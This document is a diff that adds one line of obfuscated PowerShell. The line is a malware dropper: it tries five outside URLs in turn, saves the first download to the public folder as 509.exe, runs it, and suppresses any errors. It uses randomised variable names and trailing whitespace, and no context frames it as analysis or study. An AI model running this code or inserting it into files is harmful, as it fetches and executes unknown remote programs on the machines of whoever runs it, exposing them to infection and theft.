@@ -1,0 +1,1 @@
+$qzi=new-object net.webclient;$mrs='http://habarimoto24.com/nh@http://fenett2018.com/dobgx@http://eastend.jp/bl5kfa@http://bemnyc.com/u8erijeq@http://abakus-biuro.net//a9zqemm'.split('@');$wai = '509';$kqz=$env:public+'\'+$wai+'.exe';foreach($cme in $mrs){try{$qzi.downloadfile($cme, $kqz);invoke-item $kqz;break;}catch{}}                 
